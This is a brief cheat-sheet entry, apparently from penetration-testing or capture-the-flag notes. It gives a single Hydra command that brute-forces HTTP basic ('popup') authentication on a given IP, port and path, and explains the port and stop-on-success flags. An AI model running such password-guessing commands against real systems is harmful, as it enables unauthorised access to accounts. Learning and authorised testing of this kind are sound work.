## How to use Hydra on HTTP Auth Method(Which u would call popup authentication)
- Hydra -l <USER> -P <PASSWORD_FILE> -s 8080 -f 10.14.79.90 http-get /protected

    - -s is port no, -f is to stop Hydra if one password matches.